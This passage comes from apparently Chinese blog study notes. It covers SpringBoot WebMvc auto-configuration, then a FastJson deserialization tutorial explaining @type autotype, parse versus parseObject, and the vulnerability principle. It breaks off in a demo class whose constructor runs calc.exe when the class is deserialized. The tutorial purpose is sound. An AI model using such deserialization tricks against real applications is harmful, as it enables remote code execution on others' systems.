class="meta">@Import(EnableWebMvcConfiguration.class)</span></span><br><span class="line"><span class="meta">@EnableConfigurationProperties(&#123; WebMvcProperties.class, ResourceProperties.class &#125;)</span></span><br><span class="line"><span class="meta">@Order(0)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">WebMvcAutoConfigurationAdapter</span> <span class="keyword">implements</span> <span class="title class_">WebMvcConfigurer</span> &#123;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>其中<code>WebMvcProperties</code>就是获取<strong>spring.mvc</strong>下的配置，<code>ResourceProperties</code>是<strong>spring.resources</strong></p><p><img src="/2023/06/26/SpringBoot%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/9.png"></p><p><strong>一个配置类只有一个有参构造器</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">WebMvcAutoConfigurationAdapter</span><span class="params">(ResourceProperties resourceProperties, WebMvcProperties mvcProperties, ListableBeanFactory beanFactory, ObjectProvider&lt;HttpMessageConverters&gt; messageConvertersProvider, ObjectProvider&lt;ResourceHandlerRegistrationCustomizer&gt; resourceHandlerRegistrationCustomizerProvider, ObjectProvider&lt;DispatcherServletPath&gt; dispatcherServletPath, ObjectProvider&lt;ServletRegistrationBean&lt;?&gt;&gt; servletRegistrations)</span> &#123;  </span><br><span class="line">    <span class="built_in">this</span>.resourceProperties = resourceProperties;  </span><br><span class="line">    <span class="built_in">this</span>.mvcProperties = mvcProperties;  </span><br><span class="line">    <span class="built_in">this</span>.beanFactory = beanFactory;  </span><br><span class="line">    <span class="built_in">this</span>.messageConvertersProvider = messageConvertersProvider;  </span><br><span class="line">    <span class="built_in">this</span>.resourceHandlerRegistrationCustomizer = (ResourceHandlerRegistrationCustomizer)resourceHandlerRegistrationCustomizerProvider.getIfAvailable();  </span><br><span class="line">    <span class="built_in">this</span>.dispatcherServletPath = dispatcherServletPath;  </span><br><span class="line">    <span class="built_in">this</span>.servletRegistrations = servletRegistrations;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>有参构造器所有参数的值都会从容器中确定<br>ResourceProperties resourceProperties；获取和spring.resources绑定的所有的值的对象<br>WebMvcProperties mvcProperties 获取和spring.mvc绑定的所有的值的对象<br>ListableBeanFactory beanFactory Spring的beanFactory   (Bean工厂，也就是容器)<br>HttpMessageConverters 找到所有的HttpMessageConverters<br>ResourceHandlerRegistrationCustomizer 找到 资源处理器的自定义器。&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;<br>DispatcherServletPath<br>ServletRegistrationBean   给应用注册Servlet、Filter….</p><p>只要知道 所有东西都是在容器中找即可。。</p><h2 id="资源处理默认规则"><a href="#资源处理默认规则" class="headerlink" title="资源处理默认规则"></a>资源处理默认规则</h2><p><img src="/2023/06/26/SpringBoot%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/10.png"></p><p>1、首先会从资源配置文件中查看是否设置了addMapping值(默认值为：true，代表启用静态资源规则)，当我们手动设为false后，下边注册流程便都不会被注册</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">spring: </span><br><span class="line">resources: </span><br><span class="line"><span class="keyword">static</span>-locations: classpath:/test </span><br><span class="line">add-mappings: <span class="literal">false</span></span><br></pre></td></tr></table></figure><p><img src="/2023/06/26/SpringBoot%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/11.png"></p><p>也就是当 add-mappings &#x3D;false 时  所有静态资源无法访问。</p><p>获取cache的period，即浏览器缓存时间，配置文件：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">spring:</span><br><span class="line">    resources:</span><br><span class="line">        cache:</span><br><span class="line">          period: <span class="number">10000</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>接着给webjar注册请求路径<code>/webjars/**</code>，对应的本地映射文件位置在<code>classpath:/META-INF/resources/webjars/</code></p><p>3、获取默认静态映射路径</p><p><img src="/2023/06/26/SpringBoot%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/13.png"><br>并与本地文件对应<br><img src="/2023/06/26/SpringBoot%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/12.png"><br>这也就解释了上边默认映射路径为什么是<code>/**</code>，以及默认资源访问为什么是这四个路径</p><h2 id="欢迎页处理规则"><a href="#欢迎页处理规则" class="headerlink" title="欢迎页处理规则"></a>欢迎页处理规则</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Bean</span>  </span><br><span class="line"><span class="keyword">public</span> WelcomePageHandlerMapping <span class="title function_">welcomePageHandlerMapping</span><span class="params">(ApplicationContext applicationContext, FormattingConversionService mvcConversionService, ResourceUrlProvider mvcResourceUrlProvider)</span> &#123;  </span><br><span class="line">    <span class="type">WelcomePageHandlerMapping</span> <span class="variable">welcomePageHandlerMapping</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">WelcomePageHandlerMapping</span>(<span class="keyword">new</span> <span class="title class_">TemplateAvailabilityProviders</span>(applicationContext), applicationContext, <span class="built_in">this</span>.getWelcomePage(), <span class="built_in">this</span>.mvcProperties.getStaticPathPattern());  </span><br><span class="line">    welcomePageHandlerMapping.setInterceptors(<span class="built_in">this</span>.getInterceptors(mvcConversionService, mvcResourceUrlProvider));  </span><br><span class="line">    welcomePageHandlerMapping.setCorsConfigurations(<span class="built_in">this</span>.getCorsConfigurations());  </span><br><span class="line">    <span class="keyword">return</span> welcomePageHandlerMapping;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>handlerMapping : 处理器映射。保存了每个Handler 能处理哪些请求。</p><p>欢迎页首先会判断在指定路径是否有<code>index.html</code>、默认路径是否为<code>/**</code>，如果都符合则跳转到<code>index.html</code></p><p><img src="/2023/06/26/SpringBoot%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/14.png"><br>如果前边条件不符合，则会进入else判断是否注册对应的<code>/index</code>的controller，如果有则跳转，没有则结束</p><h2 id="请求参数处理"><a href="#请求参数处理" class="headerlink" title="请求参数处理"></a>请求参数处理</h2>]]></content>
      
      
      <categories>
          
          <category> JAVA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SpringBoot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JAVA-从零到1学习FastJson反序列化</title>
      <link href="/2023/05/30/JAVA-%E4%BB%8E%E9%9B%B6%E5%88%B01%E5%AD%A6%E4%B9%A0FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2023/05/30/JAVA-%E4%BB%8E%E9%9B%B6%E5%88%B01%E5%AD%A6%E4%B9%A0FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h1 id="FastJson简单介绍"><a href="#FastJson简单介绍" class="headerlink" title="FastJson简单介绍"></a>FastJson简单介绍</h1><p>之前基础不好，所以重新写了此文<br>fastjson组件是阿里巴巴开发的反序列化与序列化的组件，依赖</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;com.alibaba&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;fastjson&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;<span class="number">1.2</span><span class="number">.23</span>&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>组件使用方法 ：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//序列化</span></span><br><span class="line"><span class="type">String</span> <span class="variable">text</span> <span class="operator">=</span> JSON.toJSONString(obj); </span><br><span class="line"><span class="comment">//反序列化</span></span><br><span class="line"><span class="type">VO</span> <span class="variable">vo</span> <span class="operator">=</span> JSON.parse(); <span class="comment">//解析为JSONObject类型或者JSONArray类型</span></span><br><span class="line"><span class="type">VO</span> <span class="variable">vo</span> <span class="operator">=</span> JSON.parseObject(<span class="string">&quot;&#123;...&#125;&quot;</span>); <span class="comment">//JSON文本解析成JSONObject类型</span></span><br><span class="line"><span class="type">VO</span> <span class="variable">vo</span> <span class="operator">=</span> JSON.parseObject(<span class="string">&quot;&#123;...&#125;&quot;</span>, VO.class); <span class="comment">//JSON文本解析成VO.class类</span></span><br></pre></td></tr></table></figure><p>我们写个demo 来测试下使用</p><p>Student.class   定义一个学生类，其包含POJO 也就是 getter  setter 方法，还有其构造函数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> &#123;  </span><br><span class="line">    <span class="keyword">private</span> String name;  </span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Student</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;构造函数&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;getName&quot;</span>);  </span><br><span class="line">        <span class="keyword">return</span> name;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;setName&quot;</span>);  </span><br><span class="line">        <span class="built_in">this</span>.name = name;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;getAge&quot;</span>);  </span><br><span class="line">        <span class="keyword">return</span> age;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;setAge&quot;</span>);  </span><br><span class="line">        <span class="built_in">this</span>.age = age;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="type">Student</span> <span class="variable">student</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>();  </span><br><span class="line">        student.setName(<span class="string">&quot;Ku1s&quot;</span>);  </span><br><span class="line">        student.setAge(<span class="number">18</span>);  </span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonstring</span> <span class="operator">=</span> JSON.toJSONString(student, SerializerFeature.WriteClassName);  </span><br><span class="line">        System.out.println(jsonstring);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的  SerializerFeature.WriteClassName  是 JSON.toJSONString() 的一个属性设置，再序列化后的时候会写入一个 @type ，即被写上序列化的类名，type可以指定反序列化的类， 并调用其 get&#x2F;set&#x2F;构造方法, 这种@type  也叫  autotype</p><p><code>autotype 是 Fastjson 中的一个重要机制，粗略来说就是用于设置能否将 JSON 反序列化成对象。</code></p><p>输出如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 设置了SerializerFeature.WriteClassName  </span></span><br><span class="line">构造函数  </span><br><span class="line">setName  </span><br><span class="line">setAge  </span><br><span class="line">getAge  </span><br><span class="line">getName  </span><br><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;Student&quot;</span>,<span class="string">&quot;age&quot;</span>:<span class="number">6</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;Mi1k7ea&quot;</span>&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// 未设置SerializerFeature.WriteClassName  </span></span><br><span class="line">构造函数  </span><br><span class="line">setName  </span><br><span class="line">setAge  </span><br><span class="line">getAge  </span><br><span class="line">getName  </span><br><span class="line">&#123;<span class="string">&quot;age&quot;</span>:<span class="number">6</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;Mi1k7ea&quot;</span>&#125;</span><br></pre></td></tr></table></figure><p>test2.class  调用JSON.parseObject() 反序列化对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonstring</span> <span class="operator">=</span><span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;FastJson.Student\&quot;,\&quot;age\&quot;:18,\&quot;name\&quot;:\&quot;Ku1s\&quot;&#125;&quot;</span>;  </span><br><span class="line">        <span class="type">Student</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parseObject(jsonstring, Student.class, Feature.SupportNonPublicField);  </span><br><span class="line">        System.out.println(obj);  </span><br><span class="line">        System.out.println(obj.getClass().getName());  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">构造函数</span><br><span class="line">setAge</span><br><span class="line">setName</span><br><span class="line">FastJson.Student@4d76f3f8</span><br><span class="line">FastJson.Student</span><br></pre></td></tr></table></figure><h2 id="Feature-SupportNonPublicField"><a href="#Feature-SupportNonPublicField" class="headerlink" title="Feature.SupportNonPublicField"></a>Feature.SupportNonPublicField</h2><p>如果要还原 private 属性的话，还需要在JSON.parseObject&#x2F;JSON.parse中加上Feature.SupportNonPublicField参数。</p><p>这里改下Student类，将私有属性age的setAge()函数注释掉（一般没人会给私有属性加setter方法，如果有 setter方法 也没有必要是private了）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> &#123;  </span><br><span class="line">    <span class="keyword">private</span> String name;  </span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Student</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;构造函数&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;getName&quot;</span>);  </span><br><span class="line">        <span class="keyword">return</span> name;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;setName&quot;</span>);  </span><br><span class="line">        <span class="built_in">this</span>.name = name;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;getAge&quot;</span>);  </span><br><span class="line">        <span class="keyword">return</span> age;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">//    public void setAge(int age) &#123;  </span></span><br><span class="line"><span class="comment">//        System.out.println(&quot;setAge&quot;);  </span></span><br><span class="line"><span class="comment">//        this.age = age;  </span></span><br><span class="line"><span class="comment">//    &#125;  </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>去掉Feature.SupportNonPublicField，添加输出两个属性getter方法的返回值：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonstring</span> <span class="operator">=</span><span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;FastJson.Student\&quot;,\&quot;age\&quot;:6,\&quot;name\&quot;:\&quot;Ku1s\&quot;&#125;&quot;</span>;  </span><br><span class="line">        <span class="type">Student</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parseObject(jsonstring, Student.class);  </span><br><span class="line">        System.out.println(obj);  </span><br><span class="line">        System.out.println(obj.getClass().getName());  </span><br><span class="line">        System.out.println(obj.getName() + <span class="string">&quot; &quot;</span> + obj.getAge());  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">构造函数</span><br><span class="line">setName</span><br><span class="line">FastJson.Student@4d76f3f8</span><br><span class="line">FastJson.Student</span><br><span class="line">getName</span><br><span class="line">getAge</span><br><span class="line">Ku1s <span class="number">0</span></span><br></pre></td></tr></table></figure><p>看到 age 会变成  0 。</p><p>如果我们再加上  Feature.SupportNonPublicField ，就能输出私有变量的值了，当然，这个英文的名也很容易理解 (支持非 public 值)</p><p>也就是说，若想让传给JSON.parseObject()进行反序列化的JSON内容指向的对象类中的私有变量成功还原出来，则需要在调用JSON.parseObject()时加上Feature.SupportNonPublicField这个属性设置才行~~~</p><h2 id="parse-和-parseObject-的区别"><a href="#parse-和-parseObject-的区别" class="headerlink" title="parse 和 parseObject 的区别"></a>parse 和 parseObject 的区别</h2><p>demo</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">jsonString1</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;age\&quot;:18,\&quot;name\&quot;:\&quot;Ku1s\&quot;&#125;\n&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">jsonString2</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;fastjson.Student\&quot;,\&quot;age\&quot;:18,\&quot;name\&quot;:\&quot;Ku1s\&quot;&#125;\n&quot;</span>;</span><br><span class="line">System.out.println(JSON.parse(jsonString1));</span><br><span class="line">System.out.println(<span class="string">&quot;======================&quot;</span>);</span><br><span class="line">System.out.println(JSON.parse(jsonString2));</span><br><span class="line">System.out.println(<span class="string">&quot;======================&quot;</span>);</span><br><span class="line">System.out.println(JSON.parseObject(jsonString1));</span><br><span class="line">System.out.println(<span class="string">&quot;======================&quot;</span>);</span><br><span class="line">System.out.println(JSON.parseObject(jsonString2));</span><br><span class="line">System.out.println(<span class="string">&quot;======================&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>结果：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;Ku1s&quot;</span>,<span class="string">&quot;age&quot;</span>:<span class="number">18</span>&#125;</span><br><span class="line">======================</span><br><span class="line">构造函数</span><br><span class="line">setAge</span><br><span class="line">setName</span><br><span class="line">fastjson.Student@4629104a</span><br><span class="line">======================</span><br><span class="line">&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;Ku1s&quot;</span>,<span class="string">&quot;age&quot;</span>:<span class="number">18</span>&#125;</span><br><span class="line">======================</span><br><span class="line">构造函数</span><br><span class="line">setAge</span><br><span class="line">setName</span><br><span class="line">getAge</span><br><span class="line">getName</span><br><span class="line">&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;Sentiment&quot;</span>,<span class="string">&quot;age&quot;</span>:<span class="number">18</span>&#125;</span><br><span class="line">======================</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以看到：</p><p>当不加上<code>@type</code>指明类，是得不到类对象的</p><p>当对加上<code>@type</code>字段的字符串进行转换后，除了能得到类对象外，<code>parse</code>会调用对应的<code>setter</code>，<code>parseObject</code>会调用<code>setter</code>和<code>getter</code></p><p>所以 ，我基本上都只用paserObject</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FastJson中的 parse() 和 parseObject()方法都可以用来将JSON字符串反序列化成Java对象，parseObject() 本质上也是调用 parse() 进行反序列化的。但是 parseObject() 会额外的将Java对象转为 JSONObject对象，即 JSON.toJSON()。所以进行反序列化时的细节区别在于，parse() 会识别并调用目标类的 setter 方法及某些特定条件的 getter 方法，而 parseObject() 由于多执行了 JSON.toJSON(obj)，所以在处理过程中会调用反序列化目标类的所有 setter 和 getter 方法。</span><br></pre></td></tr></table></figure><p>也就是说，我们用parse()反序列化会直接得到特定的类，而无需像parseObject()一样返回的是JSONObject类型的对象、还可能需要去设置第二个参数指定返回特定的类。</p><h1 id="Fastjson-反序列化漏洞原理"><a href="#Fastjson-反序列化漏洞原理" class="headerlink" title="Fastjson 反序列化漏洞原理"></a>Fastjson 反序列化漏洞原理</h1><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>前面得知， FastJson 的序列化与反序列化 不同与 java 原生的机制，无论哪个版本，fastjson 的漏洞原理都是一致的，只不过是针对黑白名单的利用来进行绕过。</p><p>攻击者可以传入一个恶意构造的JSON内容，程序对其反序列化后得到恶意类 并执行了恶意类中的恶意函数，从而代码执行。</p><h2 id="那么如何才能够反序列化出恶意类呢？"><a href="#那么如何才能够反序列化出恶意类呢？" class="headerlink" title="那么如何才能够反序列化出恶意类呢？"></a>那么如何才能够反序列化出恶意类呢？</h2><p>由前面demo知道，Fastjson使用parseObject()&#x2F;parse()进行反序列化的时候可以指定类型。如果指定的类型太大，包含太多子类，就有利用空间了。例如，如果指定类型为Object或JSONObject，则可以反序列化出来任意类。例如代码写<code>Object o = JSON.parseObject(poc,Object.class)</code>就可以反序列化出Object类或其任意子类，而Object又是任意类的父类，所以就可以反序列化出所有类。</p><h2 id="如何才能触发反序列化得到的恶意类中的恶意函数？"><a href="#如何才能触发反序列化得到的恶意类中的恶意函数？" class="headerlink" title="如何才能触发反序列化得到的恶意类中的恶意函数？"></a>如何才能触发反序列化得到的恶意类中的恶意函数？</h2><p>前面demo 得知， parseObject 反序列化时，会将类的构造函数、getter方法、setter方法执行一遍，如果这三种方法中存在危险操作，则可能导致反序列化漏洞的存在。换句话说，就是攻击者传入要进行反序列化的类中的构造函数、getter方法、setter方法中要存在漏洞才能触发。</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>我们已经知道了 如果该类的 getter setter 构造方法中如果存在 漏洞代码，则可以代码执行，所以我们这里做最简单的示范，将 Student 类中 构造函数 改为 弹计算器：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> &#123;  </span><br><span class="line">    <span class="keyword">private</span> String name;  </span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Student</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;构造函数&quot;</span>);  </span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;getName&quot;</span>);  </span><br><span class="line">        <span class="keyword">return</span> name;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;setName&quot;</span>);  </span><br><span class="line">        <span class="built_in">this</span>.name = name;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;getAge&quot;</span>);  </span><br><span class="line">        <span class="keyword">return</span> age;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">//    public void setAge(int age) &#123;  </span></span><br><span class="line"><span 